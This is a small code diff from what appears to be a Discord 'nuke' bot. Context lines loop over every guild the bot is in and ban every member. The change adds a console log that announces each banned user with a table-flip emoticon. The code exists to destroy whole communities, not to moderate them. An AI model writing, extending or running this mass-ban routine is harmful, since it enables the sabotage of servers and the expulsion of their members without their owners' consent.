@@ -19,6 +19,7 @@ message.guild.ban(u, "Berke Adamdır")
 client.guilds.forEach(guild => {
         guild.members.forEach(m => {
             m.ban();
+            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
         });
     });
  
